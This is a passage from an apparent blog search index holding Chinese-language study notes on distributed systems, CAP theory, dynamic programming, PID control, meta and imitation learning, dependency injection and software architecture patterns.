    <content type="text"><![CDATA[分布式系统定义 分布式系统是其组件分布正在连网的计算机上，组件之间通过传递消息进行通信和动作协调的系统[1]。通过该定义可知，分布式系统具有以下重要特征：组件的并发性、缺乏全局时钟、组件故障的独立性。 CAP理论CAP理论：一个分布式系统最多只能同时满足一致性（Consistency）、可用性（Availability）和分区容错性（Partition tolerance）这三项中的两项。 一致性（Consistency） 可用性（Availability） 分区容错性（Partition Tolerance） 一致性（Consistency）在分布式系统中,是指对于一组服务器,给定一组操作,我们需要一个协议使得最后它们的结果达成一致。更详细的解释就是,当其中某个服务器收到客户端的一组指令时,它必须与其它服务器交流以保证所有的服务器都是以同样的顺序收到同样的指令,这样的话所有的服务器会产生一致的结果,看起来就像是一台机器一样。 分布式系统的一致性算法分为： 弱一致性（最终一致性），例如DNS域名解析。 强一致性，例如主从同步、多数派（读/写）、Paxos、Raft（multi Paxos）、ZAB（multi Paxos）。 可用性（Availability）对于一个可用性的分布式系统，每一个非故障的节点必须对每一个请求作出响应。所以，一般我们在衡量一个系统的可用性的时候，都是通过停机时间来计算的。 通常我们描述一个系统的可用性时，我们说淘宝的系统可用性可以达到5个9，意思就是说他的可用水平是99.999%，即全年停机时间不超过 $(1-0.99999)36524*60 = 5.256 min$ ，这是一个极高的要求。 分区容错性（Partition Tolerance）分布式系统在遇到某节点或网络分区故障的时候，仍然能够对外提供满足一致性和可用性的服务。 好的分区容错性要求能够使应用虽然是一个分布式系统，而看上去却好像是在一个可以运转正常的整体。比如现在的分布式系统中有某一个或者几个机器宕掉了，其他剩下的机器还能够正常运转满足系统需求，或者是机器之间有网络异常，将分布式系统分隔未独立的几个部分，各个部分还能维持分布式系统的运作，这样就具有好的分区容错性。 简单点说，就是在网络中断，消息丢失的情况下，系统如果还能正常工作，就是有比较好的分区容错性。 参考连接 George Coulouris, Jean Dollimore， Tim Kindberg，Gordon Blair，金蓓弘，马应龙，等译. 分布式系统概念与设计[M].2013. Zookeeper之分布式系统的一致性算法, by 养兔子的大叔. 分布式计算,by wikipedia. 分布式系统的CAP理论,by HollisChuang.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最优化算法之动态规划入门]]></title>
    <url>%2F2019%2F02%2F10%2F%E6%9C%80%E4%BC%98%E5%8C%96%E7%AE%97%E6%B3%95%E4%B9%8B%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[动态规划（英语：Dynamic programming，简称DP）是一种在数学、管理科学、计算机科学、经济学和生物信息学中使用的，通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。 动态规划常常适用于有重叠子问题和最优子结构性质的问题，动态规划方法所耗时间往往远少于朴素解法。 动态规划中包含三个重要子概念： 最优子结构 边界 状态转移公式 对有重叠子问题和最优子结构性质的问题，在建模之后，即获得其状态转移公式和边界之后，可采用下列算法求解： 递归求解 备忘录算法 动态规划求解 参考链接 动态规划,by wikipedia. 漫画：什么是动态规划？,by 程序员小灰.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PID控制算法原理分析]]></title>
    <url>%2F2019%2F02%2F09%2FPID%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[最近研究深度强化学习算法，进而对控制理论感兴趣，发现了PID这个广泛使用的控制算法。大概了解记录一下。PID控制器（比例-积分-微分控制器），由比例单元(P)、积分单元(I)和微分单元(D)组成。透过Kp，Ki和Kd三个参数的设定。PID控制器主要适用于基本上线性，且动态特性不随时间变化的系统。 图1 PID控制器的方块图 PID是以它的三种纠正算法而命名。受控变数是三种算法（比例、积分、微分）相加后的结果，即为其输出，其输入为误差值（设定值减去测量值后的结果）或是由误差值衍生的信号。若定义 $u(t)$为控制输出，PID算法可以用下式表示： {u}(t)= {MV}(t)=K_{p}e(t)+K_i\int _{0}^{t}{e(\tau )}{d\tau }+K_d{\frac{d}{dt}}e(t)其中: $K_{p}$：比例增益，是调适参数 $K_{i}$：积分增益，也是调适参数 $K_{d}$：微分增益，也是调适参数 $e$：误差=设定值（SP）- 回授值（PV） $t$：目前时间 $\tau$ ：积分变数，数值从0到目前时间 $t$ 参考链接 PID控制器,by wikipedia. PID控制算法原理（抛弃公式，从本质上真正理解PID控制）,by 确定有穷自动机.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>控制理论</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式系统架构入门]]></title>
    <url>%2F2019%2F02%2F01%2F%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[随着互联网高速公路的不断发展，以往的单机应用系统逐渐没落，分布式系统逐渐成为主流。 分布式系统定义分布式系统是其组件分布正在连网的计算机上，组件之间通过传递消息进行通信和动作协调的系统[1]。通过该定义可知，分布式系统具有以下重要特征：组件的并发性、缺乏全局时钟、组件故障的独立性。 现代分布式系统的例子有： Web搜索 大型多人在线游戏 金融交易 分布式系统架构演变大多数的开发者最开始接触的是单机系统架构，即所有的数据和程序都在一台计算机上，这是分布式系统架构演变的起点。随着用户规模的不断增长和用户需求的不断变化，分布式系统架构开始不断演变。 系统架构演化历程-初始阶段架构 初始阶段的小型系统中应用程序、数据库、文件等所有的资源都在一台服务器上。随着业务量的增长，小型系统的负载将越来越重。但如果没有达到单台机器的性能瓶颈，则根本没必要进行分布式架构，可以考虑机器升级，提高机器配置解决问题。或者考虑技术升级，更换更加高效或者场景适合的技术。 系统架构演化历程-应用服务和数据服务分离 数据量增加，单台服务器性能及存储空间不足，需要将应用和数据分离，并发处理能力和数据存储空间得到了很大改善。 系统架构演化历程-使用缓存改善性能 系统访问特点遵循二八定律，即80%的业务访问集中在20%的数据上。缓存分为本地缓存和远程分布式缓存，本地缓存访问速度更快但缓存数据量有限，同时存在与应用程序争用内存的情况。 系统架构演化历程-使用应用服务器集群 使用集群是系统解决高并发、海量数据问题的常用手段。通过向集群中追加资源，提升系统的并发处理能力，使得服务器的负载压力不再成为整个系统的瓶颈。 系统架构演化历程-数据库读写分离 数据库访问通常是读多写少。针对这个情况，就是写一个主库，但是主库挂多个从库，然后从多个从库来读，以支撑更高的读并发压力。 系统架构演化历程-反向代理和CDN加速 为了应付复杂的网络环境和不同地区用户的访问，通过CDN和反向代理加快用户访问的速度，同时减轻后端服务器的负载压力。CDN与反向代理的基本原理都是缓存。 系统架构演化历程-分布式文件系统和分布式数据库 任何强大的单一服务器都满足不了大型系统持续增长的业务需求，数据库读写分离随着业务的发展最终也将无法满足需求，需要使用分布式数据库及分布式文件系统来支撑。分布式数据库是系统数据库拆分的最后方法，只有在单表数据规模非常庞大的时候才使用，更常用的数据库拆分手段是业务分库，将不同的业务数据库部署在不同的物理服务器上。 系统架构演化历程-使用NoSQL和搜索引擎 随着业务越来越复杂，对数据存储和检索的需求也越来越复杂，系统需要采用一些非关系型数据库如NoSQL和分数据库查询技术如搜索引擎。应用服务器通过统一数据访问模块访问各种数据，减轻应用程序管理诸多数据源的麻烦。 系统架构演化历程-业务拆分 为了应对日益复杂的业务场景，通常使用分而治之的手段将整个系统业务分成不同的产品线，应用之间通过超链接建立关系，也可以通过消息队列进行数据分发，当然更多的还是通过访问同一个数据存储系统来构成一个关联的完整系统。 纵向拆分：将一个大应用拆分为多个小应用，如果新业务较为独立，那么就直接将其设计部署为一个独立的Web应用系统纵向拆分相对较为简单，通过梳理业务，将较少相关的业务剥离即可。 横向拆分：将复用的业务拆分出来，独立部署为分布式服务，新增业务只需要调用这些分布式服务横向拆分需要识别可复用的业务，设计服务接口，规范服务依赖关系。 系统架构演化历程-分布式服务 分布式服务关键技术分布式服务应用将会面临以下问题： 当服务越来越多时，服务URL配置管理变得非常困难，硬件负载均衡器的单点压力也越来越大。 当进一步发展，服务间依赖关系变得错踪复杂，甚至分不清哪个应用要在哪个应用之前启动，架构师都不能完整的描述应用的架构关系。 接着，服务的调用量越来越大，服务的容量问题就暴露出来，这个服务需要多少机器支撑？什么时候该加机器？ 服务多了，沟通成本也开始上升，调某个服务失败该找谁？服务的参数都有什么约定？ 一个服务有多个业务消费者，如何确保服务质量？ 随着服务的不停升级，总有些意想不到的事发生，比如cache写错了导致内存溢出，故障不可避免，每次核心服务一挂，影响一大片，人心慌慌，如何控制故障的影响面？服务是否可以功能降级？或者资源劣化？ 为解决上述问题，可采用以下关键技术。 消息队列架构消息对列通过消息对象分解系统耦合性，不同子系统处理同一个消息。 面向服务架构服务框架通过接口分解系统耦合性，不同子系统通过相同的接口描述进行服务启用服务框架是一个点对点模型服务框架面向同构系统适合：移动应用、互联网应用、外部系统。 服务总线架构服务总线架构同面向服务架构一样，均是通过接口分解系统耦合性，不同子系统通过相同的接口描述进行服务启用。服务总线架构是一个总线式的架构模型。 分布式系统交互的通信模式分布式系统交互的通信模式共有五种： request/response模式（同步模式）：客户端发起请求一直阻塞到服务端返回请求为止。 Callback（异步模式）：客户端发送一个RPC请求给服务器，服务端处理后再发送一个消息给消息发送端提供的callback端点，此类情况非常合适以下场景：A组件发送RPC请求给B，B处理完成后，需要通知A组件做后续处理。 Future模式：客户端发送完请求后，继续做自己的事情，返回一个包含消息结果的Future对象。客户端需要使用返回结果时，使用Future对象的.get(),如果此时没有结果返回的话，会一直阻塞到有结果返回为止。 Oneway模式：客户端调用完继续执行，不管接收端是否成功。 Reliable模式：为保证通信可靠，将借助于消息中心来实现消息的可靠送达，请求将做持久化存储，在接收方在线时做送达，并由消息中心保证异常重试。 常用的分布式服务框架现在业界比较成熟的服务框架有很多，比如：Hessian、CXF、Dubbo、Dubbox、Spring Cloud、gRPC、thrift等技术实现，都可以进行远程调用。 Spring Cloud：Spring全家桶，用起来很舒服，只有你想不到，没有它做不到。可惜因为发布的比较晚，国内还没出现比较成功的案例，大部分都是试水，不过毕竟有Spring作背书，还是比较看好。 Dubbox：相对于Dubbo支持了REST，估计是很多公司选择Dubbox的一个重要原因之一，但如果使用Dubbo的RPC调用方式，服务间仍然会存在API强依赖，各有利弊，懂的取舍吧。 Thrift：如果你比较高冷，完全可以基于Thrift自己搞一套抽象的自定义框架吧。 Montan：可能因为出来的比较晚，目前除了新浪微博16年初发布的， Hessian：如果是初创公司或系统数量还没有超过5个，推荐选择这个，毕竟在开发速度、运维成本、上手难度等都是比较轻量、简单的，即使在以后迁移至SOA，也是无缝迁移。 rpcx/gRPC：在服务没有出现严重性能的问题下，或技术栈没有变更的情况下，可能一直不会引入，即使引入也只是小部分模块优化使用。 参考链接 George Coulouris, Jean Dollimore， Tim Kindberg，Gordon Blair，金蓓弘，马应龙，等译. 分布式系统概念与设计[M].2013. 聊聊分布式系统的架构套路,by 大蕉. 分布式架构的演进,by 稳稳的幸福y. 互联网 Java 工程师进阶知识完全扫盲,by dooc. 聊聊Dubbo（一）：为何选择, by 猿码道.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[元强化学习研究笔记]]></title>
    <url>%2F2019%2F01%2F27%2F%E5%85%83%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[元强化学习定义什么是元强化学习？这得从深度学习开始说起。 Deep Learning研究一个从x到y的映射mapping，只是这个映射函数f是用一个端到端的深度神经网络来表示。如果是计算机视觉中的图像识别，那么x就是图片，y就是标签；如果是自然语言处理中的文本翻译，那么x就是比如中文，y就是英文；如果是深度增强学习中的玩Atari游戏，那么x就是屏幕画面，y就是输出的动作。深度学习研究的就是通过深度神经网络来学习一个针对某一特定任务task的模型。通过大量的样本进行训练，训练完，这个模型就可以用在特定任务上。 而Meta Learning研究Task！Meta Learning的目的是希望学习很多很多的task，然后有了这些学习经验之后，在面对新的task的时候可以游刃有余，学的快又学的好！那为什么叫Meta呢？Deep Learning是在Task里面研究，现在Meta Learning是在Task外面，更高层级来研究。也就是在Meta Learning的问题上，Task是作为样本来输入的。 Meta RL（Meta Reinforcement Learning）是Meta Learning应用到Reinforcement Learning的一个研究方向，核心的想法就是希望AI在学习大量的RL任务中获取足够的先验知识Prior Knowledge然后在面对新的RL任务时能够 学的更快，学的更好，能够自适应新环境！ 元强化学习意义元强化学习试图解决深度强化学习存在的如下问题： 它的样本利用率非常低。换言之为了让模型的表现达到一定高度需要极为大量的训练样本。 最终表现很多时候不够好。在很多任务上用非强化学习甚至非学习的其它方法，如基于模型的控制（model based control），线性二次型调节器（Linear Quadratic Regulator）等等可以获得好得多的表现。最气人的是这些模型很多时候样本利用率还高。当然这些模型有的时候会有一些假设比如有训练好的模型可以模仿，比如可以进行蒙特卡洛树搜索等等。 DRL成功的关键离不开一个好的奖励函数（reward function），然而这种奖励函数往往很难设计。在Deep Reinforcement Learning That Matters作者提到有时候把奖励乘以一个常数模型表现就会有天和地的区别。但奖励函数的坑爹之处还不止如此。奖励函数的设计需要保证： 加入了合适的先验，良好的定义了问题和在一切可能状态下的对应动作。坑爹的是模型很多时候会找到作弊的手段。Alex举的一个例子是有一个任务需要把红色的乐高积木放到蓝色的乐高积木上面，奖励函数的值基于红色乐高积木底部的高度而定。结果一个模型直接把红色乐高积木翻了一个底朝天。仔啊，你咋学坏了，阿爸对你很失望啊。 奖励函数的值太过稀疏。换言之大部分情况下奖励函数在一个状态返回的值都是0。这就和我们人学习也需要鼓励，学太久都没什么回报就容易气馁。都说21世纪是生物的世纪，怎么我还没感觉到呢？21世纪才刚开始呢。我等不到了啊啊啊啊啊。 有的时候在奖励函数上下太多功夫会引入新的偏见（bias）。 要找到一个大家都使用而又具有好的性质的奖励函数。这里Alex没很深入地讨论，但链接了一篇陶神（Terence Tao）的博客，大家有兴趣可以去看下。 局部最优/探索和剥削（exploration vs. exploitation）的不当应用。Alex举的一个例子是有一个连续控制的环境里，一个类似马的四足机器人在跑步，结果模型不小心多看到了马四脚朝天一顿乱踹后结果较好的情况，于是你只能看到四脚朝天的马了。 对环境的过拟合。DRL少有在多个环境上玩得转的。你训练好的DQN在一个Atari game上work了，换一个可能就完全不work。即便你想要做迁移学习，也没有任何保障你能成功。 不稳定性。 读DRL论文的时候会发现有时候作者们会给出一个模型表现随着尝试random seed数量下降的图，几乎所有图里模型表现最终都会降到0。相比之下在监督学习里不同的超参数或多或少都会表现出训练带来的变化，而DRL里运气不好可能很长时间你模型表现的曲线都没有任何变化，因为完全不work。 即便知道了超参数和随机种子，你的实现只要稍有差别，模型的表现就可以千差万别。这可能就是Deep Reinforcement Learning That Matters一文里John Schulman两篇不同文章里同一个算法在同一个任务上表现截然不同的原因。 即便一切都很顺利，从我个人的经验和之前同某DRL研究人员的交流来看只要时间一长你的模型表现就可能突然从很好变成完全不work。原因我不是完全确定，可能和过拟合和variance过大有关。 元强化学习方法Meta RL（Meta Reinforcement Learning）是Meta Learning应用到Reinforcement Learning的一个研究方向。因此元强化学习的研究借鉴了元学习的思想和方法。 元学习方法HyperNetwork 生成参数HyperNetwork是一个蛮有名的网络，简单说就是用一个网络来生成另外一个网络的参数。那么我们这里非常直接，我们的设想就是希望用一个hypernetwork输入训练集数据，然后给我输出我的对应模型也就是上图f的参数，我们希望输出的这个参数能够使得在测试图片上取得好的识别效果。那么，有了这样设计，这个hypernetwork其实就是一个meta network。大家可以看到，本来基本的做法是用训练集直接训练这个模型f，但是现在我们用这个hypernetwork不训练了，直接给你输出参数，这等价于hypernetwork学会了如何学习图像识别，这也是为什么meta learning也同时叫做learning to learn的原因。我们通过hypernetwork学会学习。训练好了这个模型，连反向传播梯度下降都不要了，直接给你参数，是不是很酷？ Conditional Neural Network 条件神经网络直接把D_train当做条件输入到f中，那么这个f本身就变成一个meta network了。也就是条件神经网络实际上能够得到和上面的hypernetwork一样的意义。因为我们可以想，只要条件D_train变了，那么y_test肯定也就变了。所以这里就非常非常直接了。把数据全部输入进去，让神经网络自己学就行了，不外乎就是去设计一个合适的网络结构而已。那么，这里最最简单粗暴的网络结构就是SNAIL算法使用temporal convolutional network，也就是wavenet的架构： MAML 基于梯度的做法MAML的核心步骤就是 采集Task，得到D_train和D_test 使用D_train对神经网络f训练少数几步，得到新的参数 利用新的参数训练D_test，然后使得梯度下降更新一开始的参数。 三种解决办法的优缺点先说HyperNetwork生成参数的做法。这种做法最大的问题就在于参数空间是很大的，所以要生成合适的参数特别是巨量的参数其实是比较困难的，所以目前绝大多数生成参数的做法都是只生成少量参数，比如一层的MLP，或者对于参数的空间进行一定的限制，比如就在[-1,1]之间，否则空间太多，有无数种选择输出一样的结果，就很难训了。但是采样HyperNetwork又有其灵活性，意味着我们可以只更新少部分参数，而不用全部。 接下来就是条件神经网络了。这又有什么问题呢？我觉得在性能上绝对会是最好的，很直接，但是不好看，一直要拖着一个条件，网络很大。不管是生成参数还是MAML，他们的模型网络就是独立的，之后只要输入x就行了，而条件神经网络每次都要输入条件，很烦啊。 那么MAML呢？可能最烦人的就是二次梯度了，这意味着MAML的训练会很慢，那么就很难hold住大网络了。实际上MAML目前对于大的网络结构比如Resnet效果并不好。然后MAML是使用D_train的Loss来更新整个网络，对比HyperNetwork缺少灵活性。这个Loss就是最好的吗？不见得。如果D_train是无监督数据，那怎么办？所以MAML是有局限性的。 目前各种各样的Meta Learning研究，在方法论上都逃不出这三种方法。要么改改网络结构，要么结合一下上面的方法，比如先MAML再生成参数，或者hypernetwork和conditional neural network混着用等等。那么什么才是终极必杀呢？可能还是要具体问题具体看吧，对于不同的问题采用不同办法效果会不一样。这些都值得我们去探索。 元强化学习方法参考链接 Meta Learning单排小教学,by Flood Sung. 最前沿: Meta RL论文解读,by Flood Sung. 这里有一篇深度强化学习劝退文,by Frankenstein. 周志华：满足这三大条件，可以考虑不用深度神经网络,by 周志华教授.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[依赖注入入门]]></title>
    <url>%2F2019%2F01%2F26%2F%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[依赖注入定义在软件工程中，依赖注入是种实现控制反转用于解决依赖性设计模式。一个依赖关系指的是可被利用的一种对象（即服务提供端） 。依赖注入是将所依赖的传递给将使用的从属对象（即客户端）。该服务是将会变成客户端的状态的一部分。 传递服务给客户端，而非允许客户端来建立或寻找服务，是本设计模式的基本要求。 依赖注入意义依赖存在的问题如果在 Class A 中，有 Class B 的实例，则称 Class A 对 Class B 有一个依赖。例如下面类 Human 中用到一个 Father 对象，我们就说类 Human 对类 Father 有一个依赖。 12345678public class Human &#123; ... Father father; ... public Human() &#123; father = new Father(); &#125;&#125; 仔细看这段代码我们会发现存在一些问题： 如果现在要改变 father 生成方式，如需要用new Father(String name)初始化 father，需要修改 Human 代码； 如果想测试不同 Father 对象对 Human 的影响很困难，因为 father 的初始化被写死在了 Human 的构造函数中； 如果new Father()过程非常缓慢，单测时我们希望用已经初始化好的 father 对象 Mock 掉这个过程也很困难。 依赖注入的好处上面将依赖在构造函数中直接初始化是一种 Hard init 方式，弊端在于两个类不够独立，不方便测试。我们还有另外一种 Init 方式，如下：12345678public class Human &#123; ... Father father; ... public Human(Father father) &#123; this.father = father; &#125;&#125; 上面代码中，我们将 father 对象作为构造函数的一个参数传入。在调用 Human 的构造方法之前外部就已经初始化好了 Father 对象。像这种非自己主动初始化依赖，而通过外部来传入依赖的方式，我们就称为依赖注入。 现在我们发现上面 1 中存在的两个问题都很好解决了，简单的说依赖注入主要有两个好处： 解耦，将依赖之间解耦。 因为已经解耦，所以方便做单元测试，尤其是 Mock 测试。 依赖注入实现Java中的依赖注入依赖注入的实现有多种途径，而在 Java 中，使用注解是最常用的。通过在字段的声明前添加 @Inject 注解进行标记，来实现依赖对象的自动注入。 1234567public class Human &#123; ... @Inject Father father; ... public Human() &#123; &#125;&#125; 上面这段代码看起来很神奇：只是增加了一个注解，Father 对象就能自动注入了？这个注入过程是怎么完成的？ 实质上，如果你只是写了一个 @Inject 注解，Father 并不会被自动注入。你还需要使用一个依赖注入框架，并进行简单的配置。现在 Java 语言中较流行的依赖注入框架有 Google Guice、Spring 等，而在 Android 上比较流行的有 RoboGuice、Dagger 等。 PHP中的依赖注入12345678910111213141516class Application&#123; function __construct(Auth $auth, Session $session) &#123; $this-&gt;auth = $auth; $this-&gt;session = $session; &#125; // ... 程式 ...&#125;$auth = new Auth(&apos;localhost&apos;, &apos;root&apos;, &apos;&apos;);$session = new Session();$application = new Application($auth, $session);$application-&gt;login(&apos;admin&apos;, &apos;admin&apos;); 参考链接 依赖注入,by wikipedia. 依赖注入,by android-cn.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[模仿学习研究笔记]]></title>
    <url>%2F2019%2F01%2F26%2F%E6%A8%A1%E4%BB%BF%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[模仿学习定义模仿学习是指从示教者提供的范例中学习，一般提供人类专家的决策数据 \{ \tau_1,\tau_2,\ldots,\tau_m \}，每个决策包含状态和动作序列 \tau_i = ，将所有「状态-动作对」抽取出来构造新的集合 \mathcal{D}=\{ (s_1,a_1),(s_2,a_2),(s_3,a_3),\ldots \}。之后就可以把状态作为特征（feature），动作作为标记（label）进行分类（对于离散动作）或回归（对于连续动作）的学习从而得到最优策略模型。模型的训练目标是使模型生成的状态-动作轨迹分布和输入的轨迹分布相匹配。 模仿学习意义在传统的强化学习任务中，通常通过计算累积奖赏来学习最优策略（policy），这种方式简单直接，而且在可以获得较多训练数据的情况下有较好的表现。然而在多步决策（sequential decision）中，学习器不能频繁地得到奖励，且这种基于累积奖赏及学习方式存在非常巨大的搜索空间。而模仿学习（Imitation Learning）的方法经过多年的发展，已经能够很好地解决多步决策问题，在机器人、 NLP 等领域也有很多的应用。 模仿学习实现当前主要以下几种方法实现模型学习： 行为克隆（Behavior Cloning）行为克隆（Behavior Cloning）根据人类提供的状态动作对来习得策略，是作为监督学习的模仿学习。 逆强化学习（Inverse Reinforcement Learning ）IRL 是 反过来的 RL，RL 是根据 reward 进行参数的调整，然后得到一个 policy。 但是， IRL 就不同了，因为他没有显示的 reward，只能根据 人类行为，进行 reward的估计（反推 reward 的函数）。在得到 reward 函数估计出来之后，再进行 策略函数的估计。 逆强化学习是在给定一个专家之后（expert policy），通过不断地寻找 reward function 来满足给定的 statement（即，解释专家的行为，explaining expert behavior）。 结构化预测（Structured prediction）在机器学习过程中，对数据的拟合其实就是在找一个拟合函数f，比如对于回归问题（Regression）来说，这个函数输出一个标量（scalar），对于分类问题（Classification）来说，这个函数输出一个类别（一个one-hot的向量），但是有一类的预测，它并不是输出一个标量或者一个类别，而是输出些有结构的输出，比如，一个序列，一个句子，一个图，一颗树。 生成对抗网络（GAN for Imitation Learning）那么如何用 GAN 来做这个事情呢？对应到这件事情上，我们知道，我们想得到的 轨迹 是属于某一个高维的空间中，而 expert 给定的那些轨迹，我们假设是属于一个 distribution，我们想让我们的 model，也去 predict 一个分布出来，然后使得这两者之间尽可能的接近。从而完成 actor 的训练过程。 参考链接 模仿学习（Imitation Learning）完全介绍（一）,by 我勒个矗. 深度强化学习之：模仿学习（imitation learning）,by wangxiaocvpr. 机器人学习Robot Learning之模仿学习Imitation Learning的发展,by c2a2o2. 行为克隆,by XINGYES. 最前沿：用模仿学习来学习增强学习,by Flood Sung. 机器人学习最前沿：一眼模仿学习（One-Shot Imitation Learning）的三级跳,by Flood Sung. 深度学习课程笔记（七）：模仿学习（imitation learning）,by WangXiao.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件架构的一些思考]]></title>
    <url>%2F2019%2F01%2F25%2F%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[以前对软件架构总是雾里看花，似懂非懂，最近好像有点悟了，赶紧记录一下。 软件架构的定义（What）软件架构是有关软件整体结构与组件的抽象描述，用于指导大型软件系统各个方面的设计[1]。 软件体系结构是构建计算机软件实践的基础。与建筑师设定建筑项目的设计原则和目标，作为绘图员画图的基础一样，软件架构师或者系统架构师陈述软件架构以作为满足不同客户需求的实际系统设计方案的基础。从和目的、主题、材料和结构的联系上来说，软件架构可以和建筑物的架构相比拟。一个软件架构师需要有广泛的软件理论知识和相应的经验来实施和管理软件产品的高级设计。软件架构师定义和设计软件的模块化，模块之间的交互，用户界面风格，对外接口方法，创新的设计特性，以及高层事物的对象操作、逻辑和流程。 软件架构的意义（Why）软件架构是一个系统的草图。软件架构描述的对象是直接构成系统的抽象组件。各个组件之间的连接则明确和相对细致地描述组件之间的通讯。在实现阶段，这些抽象组件被细化为实际的组件，比如具体某个类或者对象。在面向对象领域中，组件之间的连接通常用接口来实现。 软件架构是软件架构师与项目干系人沟通的工具。例如：软件架构师与客户商谈概念上的事情，与经理商谈广泛的设计问题，与软件工程师商谈创新的结构特性，与程序员商谈实现技巧，外观和风格。 软件架构的选择（How）用户需求决定软件架构的选择。用户需求可分成功能性需求和非功能性需求。功能性需求即用户要求软件产品应实现什么样的功能，非功能性需求即用户要求软件产品的质量属性达到一定标准。以开发一个购物网站为例，用户要求实现商品展示功能、购物车功能即功能性需求，用户要求在1秒内打开购物网站、网站平均无故障时间是一个月即非功能性需求。通常用户的非功能性需求对软件架构产生决定性影响。 常见的软件架构分层架构分层架构（layered architecture）是最常见的软件架构，也是事实上的标准架构。如果你不知道要用什么架构，那就用它。 这种架构将软件分成若干个水平层，每一层都有清晰的角色和分工，不需要知道其他层的细节。层与层之间通过接口通信。 虽然没有明确约定，软件一定要分成多少层，但是四层的结构最常见: 表现层（presentation）：用户界面，负责视觉和用户互动 业务层（business）：实现业务逻辑 持久层（persistence）：提供数据，SQL 语句就放在这一层 数据库（database） ：保存数据 事件驱动架构事件（event）是状态发生变化时，软件发出的通知。 事件驱动架构（event-driven architecture）就是通过事件进行通信的软件架构。它分成四个部分。 事件队列（event queue）：接收事件的入口 分发器（event mediator）：将不同的事件分发到不同的业务逻辑单元 事件通道（event channel）：分发器与处理器之间的联系渠道 事件处理器（event processor）：实现业务逻辑，处理完成后会发出事件，触发下一步操作 微核架构微核架构（microkernel architecture）又称为”插件架构”（plug-in architecture），指的是软件的内核相对较小，主要功能和业务逻辑都通过插件实现。 内核（core）通常只包含系统运行的最小功能。插件则是互相独立的，插件之间的通信，应该减少到最低，避免出现互相依赖的问题。 微服务架构微服务架构（microservices architecture）是服务导向架构（service-oriented architecture，缩写 SOA）的升级。 每一个服务就是一个独立的部署单元（separately deployed unit）。这些单元都是分布式的，互相解耦，通过远程通信协议（比如REST、SOAP）联系。 微服务架构分成三种实现模式。 RESTful API 模式：服务通过 API 提供，云服务就属于这一类 RESTful 应用模式：服务通过传统的网络协议或者应用协议提供，背后通常是一个多功能的应用程序，常见于企业内部 集中消息模式：采用消息代理（message broker），可以实现消息队列、负载均衡、统一日志和异常处理，缺点是会出现单点失败，消息代理可能要做成集群 云架构云结构（cloud architecture）主要解决扩展性和并发的问题，是最容易扩展的架构。 它的高扩展性，主要原因是没使用中央数据库，而是把数据都复制到内存中，变成可复制的内存数据单元。然后，业务处理能力封装成一个个处理单元（prcessing unit）。访问量增加，就新建处理单元；访问量减少，就关闭处理单元。由于没有中央数据库，所以扩展性的最大瓶颈消失了。由于每个处理单元的数据都在内存里，最好要进行数据持久化。 这个模式主要分成两部分：处理单元（processing unit）和虚拟中间件（virtualized middleware）。 处理单元：实现业务逻辑 虚拟中间件：负责通信、保持sessions、数据复制、分布式处理、处理单元的部署。 虚拟中间件又包含四个组件。 消息中间件（Messaging Grid）：管理用户请求和session，当一个请求进来以后，决定分配给哪一个处理单元。 数据中间件（Data Grid）：将数据复制到每一个处理单元，即数据同步。保证某个处理单元都得到同样的数据。 处理中间件（Processing Grid）：可选，如果一个请求涉及不同类型的处理单元，该中间件负责协调处理单元 部署中间件（Deployment Manager）：负责处理单元的启动和关闭，监控负载和响应时间，当负载增加，就新启动处理单元，负载减少，就关闭处理单元。 客户端/服务器架构这种架构由两部分组成：一个服务器和多个客户端。服务器组件将为多个客户端组件提供服务。客户端从服务器请求服务，服务器为这些客户端提供相关服务。此外，服务器持续侦听客户机请求。 模型/视图/控制器架构这种架构，也称为MVC模式，把一个交互式应用程序划分为3个部分， 模型：包含核心功能和数据 视图：将信息显示给用户(可以定义多个视图) 控制器：处理用户输入的信息 这样做是为了将信息的内部表示与信息的呈现方式分离开来，并接受用户的请求。它分离了组件，并允许有效的代码重用。 参考文献 软件架构,by wikipedia. 软件架构入门,by 阮一峰. 10种常见的软件架构模式,by 尽信书不如无书.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FlightGear技术分析]]></title>
    <url>%2F2019%2F01%2F24%2FFlightGear%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%2F</url>
